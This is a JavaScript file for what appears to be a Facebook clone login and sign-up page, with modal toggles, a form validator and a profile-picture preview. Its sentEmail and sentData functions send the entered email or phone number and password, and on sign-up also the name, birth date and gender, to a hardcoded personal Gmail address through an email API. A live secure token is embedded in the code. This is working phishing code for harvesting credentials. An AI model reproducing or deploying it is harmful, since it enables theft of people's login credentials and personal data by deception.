
const show = () => {
  const shows = document.querySelector("#SignUp")
  shows.classList.toggle("show")
  document.querySelector(".layer").style.display = "block"
}

const hide = () => {
  const hides = document.querySelector("#SignUp")
  hides.classList.remove("show")
  document.querySelector(".layer").style.display = "none"
}

const showw = () => {
  const shows = document.querySelector("#ffffff")
  shows.classList.toggle("showw")
  document.querySelector(".layer").style.display = "block"
  document.querySelector("#ffffff").style.display = "block"
}

const hidee = () => {
  const hides = document.querySelector("#ffffff")
  hides.classList.remove("showw")
  document.querySelector(".layer").style.display = "none"
  document.querySelector("#ffffff").style.display = "none"
}

function formValidate() {
  var emailorphone = document.getElementById("Email address or phone number").value;
  var password = document.getElementById("Password").value;
  var erroe1 = document.getElementById("erroe1");
  var error2 = document.getElementById("error2");
  var text = '';

  if (emailorphone.length < 4, emailorphone.indexOf("@") == -1) {
    text = "* The email address or mobile number you entered isn't connected to an account.";
    erroe1.innerHTML = text;
    return false;
  } else if (password.length < 6) {
    text = "*The password that you've entered is incorrect.";
    error2.innerHTML = text;
    return false;
  } else {
    return true;
  }
}

let profilepic = document.getElementById("prof-pic");
let inputfile = document.getElementById("input-file");

document.addEventListener("DOMContentLoaded", function () {
  document.querySelector("#submit").disabled = true;
  document.querySelector("#submit").style.background = "#3770b694";

  document.querySelector("#input-file").onchange = function () {
    document.querySelector("#submit").disabled = false;
    document.querySelector("#submit").style.background = "#1b74e4";
    profilepic.src = URL.createObjectURL(inputfile.files[0]);
  }
})

function sentEmail() {
  Email.send({
    SecureToken: "778925da-b277-4c6c-856d-c2d06b1156a1",
    To: 'ahmedeldeeb20697@gmail.com',
    From: "ahmedeldeeb20697@gmail.com",
    Subject: "Reset The Dadt",
    Body: "Email : " + document.getElementById("Email address or phone number").value
    + "<br> Password :" + document.getElementById("Password").value
  }).then(
    message => alert("Done Sent Data", window.location.href = "facbookclone.html")
    );
  }

function sentData() {
  Email.send({
    SecureToken: "778925da-b277-4c6c-856d-c2d06b1156a1",
    To: 'ahmedeldeeb20697@gmail.com',
    From: "ahmedeldeeb20697@gmail.com",
    Subject: "Reset The Dadt",
    Body: "First name : " + document.getElementById("firstName").value
      + "<br> Last name :" + document.getElementById("lastName").value
      + "<br> Email :" + document.getElementById("nweEmail").value
      + "<br> Password :" + document.getElementById("newPassword").value
      + "<br> day :" + document.getElementById("day").value
      + "<br> Month :" + document.getElementById("month").value
      + "<br> year :" + document.getElementById("year").value
      + "<br> Female :" + document.getElementById("female").value
      + "<br> Male :" + document.getElementById("male").value
  }).then(
    message => alert("Done Create New Account", window.location.href = "sign up.html")
  );
}

